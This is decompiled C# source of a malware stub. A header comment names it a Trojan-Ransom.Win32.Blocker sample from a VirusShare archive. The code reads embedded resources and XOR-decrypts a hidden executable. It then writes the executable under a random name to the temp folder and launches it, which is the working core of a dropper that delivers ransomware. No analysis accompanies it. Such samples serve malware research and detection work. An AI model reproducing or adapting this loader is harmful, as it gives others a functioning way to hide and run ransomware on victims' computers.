// Decompiled with JetBrains decompiler
// Type: oOstub.Module1
// Assembly: oOstub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7C811413-DDA1-421A-9886-E9438E6DDB06
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jgrj-929d982a6d08bd3bbab38fd5617da5fe5d9dafbcf6c89e011e42b409ef5deee6.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Text;

namespace oOstub
{
  [StandardModule]
  internal sealed class Module1
  {
    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Main()
    {
      string str1 = Module1.Decrypt(Encoding.Default.GetString(ResourceReader.ReadResource(10, "1", (ushort) 0)), Encoding.Default.GetString(ResourceReader.ReadResource(10, "0", (ushort) 0)));
      string str2 = Conversions.ToString(Module1.GenStr(10L));
      FileSystem.FileOpen(1, Environment.GetEnvironmentVariable("temp") + "\\dd_" + str2 + ".exe", OpenMode.Binary, OpenAccess.Write);
      FileSystem.FilePut(1, str1, -1L, false);
      FileSystem.FileClose(1);
      Process.Start(Environment.GetEnvironmentVariable("temp") + "\\dd_" + str2 + ".exe");
    }

    public static object GenStr(long len)
    {
      Random random = new Random();
      string str1 = "abcdefghijklmnopqrstuvwxyz";
      string str2 = (string) null;
      long num1 = len;
      long num2 = 0;
      while (num2 <= num1)
      {
        str2 += Conversions.ToString(str1[random.Next(str1.Length)]);
        checked { ++num2; }
      }
      return (object) str2;
    }

    public static string Decrypt(string pass, string Input)
    {
      StringBuilder stringBuilder = new StringBuilder();
      int num = checked (Input.Length - 1);
      int startIndex = 0;
      while (startIndex <= num)
      {
        int index;
        string str = Conversions.ToString(Strings.Chr(checked ((int) (Conversions.ToLong("&H" + Input.Substring(startIndex, 2)) ^ (long) Strings.Asc(pass[index])))));
        stringBuilder.Append(str);
        if (index == checked (pass.Length - 1))
          index = 0;
        else
          checked { ++index; }
        checked { startIndex += 2; }
      }
      return stringBuilder.ToString();
    }
  }
}
